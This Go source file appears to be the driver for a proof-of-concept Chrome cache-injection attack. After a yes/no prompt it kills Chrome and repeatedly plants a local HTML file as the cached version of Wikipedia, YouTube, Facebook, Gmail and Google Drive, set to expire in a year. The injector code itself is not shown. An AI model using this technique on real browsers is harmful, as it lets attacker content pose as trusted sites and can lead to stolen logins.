package main 

import (
	"fmt"
	"time"
	"strings"
	"runtime"
	"io/ioutil"
	"os/exec"

	"chrome-poc/injector"
)

const (
	TestHtmlFilePath = "./test-files/test.html"
)

var (
	PageUrls = []string{
		"https://en.wikipedia.org/wiki/Main_Page",
		"https://www.youtube.com/",
		"https://www.facebook.com/",
		"https://mail.google.com/",
		"https://www.google.com/drive/",
	}
)

func readFile(path string) []byte {
	fileData, err := ioutil.ReadFile(path)
	if err != nil {
		panic(err)
	}
	return fileData
}

func killProc(name string) {
	exec.Command("pkill", "-SIGKILL", name).Run()
}

func checkUserApproval() bool {
	fmt.Printf(
		"Do you want to inject code from %v into these web pages in Chrome?" +
		"\n\n%v\n" +
		"NOTE: You can modify the list of test urls for injection in main.go\n\n" +
		" yes/no\n", 
		TestHtmlFilePath,
		PageUrls,
	)

	var input string
 	fmt.Scanln(&input)

	return strings.ToLower(input) == "yes"
}

func main() {
	fmt.Println("Chrome POC demo")

	if runtime.GOOS == "windows" {
		fmt.Println("Windows isn't supported")
		return 
	}

	if !checkUserApproval() {
		fmt.Println("Exiting...")
		return
	}

	testContent := readFile(TestHtmlFilePath)

	chromeInjector := injector.ChromeInjector{}
	chromeInjector.ExpireDate = time.Now().Add(time.Hour * 24 * 365)
	chromeInjector.Urls = PageUrls
	chromeInjector.Content = testContent
	chromeInjector.ContentType = "text/html"

	/* use this to reduce the size of the generated cache file */
	// chromeInjector.GzipContent()

	killProc("Chrome")

	for {
		fmt.Println("\nInjecting cache data...")

		chromeInjector.Inject()

		time.Sleep(5 * time.Second)
	}
}